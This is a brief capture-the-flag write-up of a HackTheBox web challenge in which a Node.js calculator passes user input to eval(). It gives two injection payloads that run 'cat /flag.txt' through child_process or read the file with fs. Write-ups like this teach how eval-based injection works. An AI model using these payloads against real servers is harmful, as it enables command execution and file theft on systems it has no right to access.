---
title: jscalc
tags:
  - HackTheBox
  - Challenge
  - Web
  - Nodejs
  - LFI
date: 2025-02-17T00:00:00Z
---
![](Pasted%20image%2020250217130021.png)

It seems to be a calculator written in javascript that uses the ***super secure*** function `eval()`. I'll inspect the source code of the function:

![](Pasted%20image%2020250217130204.png)

The `Calculator` calls a function called `calculate()`:

![](Pasted%20image%2020250217130214.png)

So this is where the `eval()` is being used. Checking the `Dockerfile` I know that the flag is under `/flag.txt`:

![](Pasted%20image%2020250217130406.png)

So I'll try to get a LFI to read its content by the `child_process()` function:

```js
require('child_process').execSync('cat /flag.txt').toString()
```

![](Pasted%20image%2020250217131336.png)

### Other payload

```js
require('fs').readFileSync('/flag.txt', 'utf8')
```

![](Pasted%20image%2020250217131429.png)

==Challenge completed!==

